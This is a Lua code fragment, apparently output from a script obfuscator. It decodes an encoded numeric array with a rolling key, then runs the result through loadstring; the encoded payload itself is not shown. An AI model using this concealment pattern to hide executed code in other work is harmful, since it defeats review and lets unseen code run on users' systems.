    local function VM_O1O0I1(d, k, m)
        local R_ll1Ol0 = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_ll1Ol0, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_ll1Ol0)
    end

    -- Execution Guard
    local F_IO01110 = loadstring(VM_O1O0I1(B_I011lIll, 94, 5))
    if F_IO01110 then
        F_IO01110(...)
    end
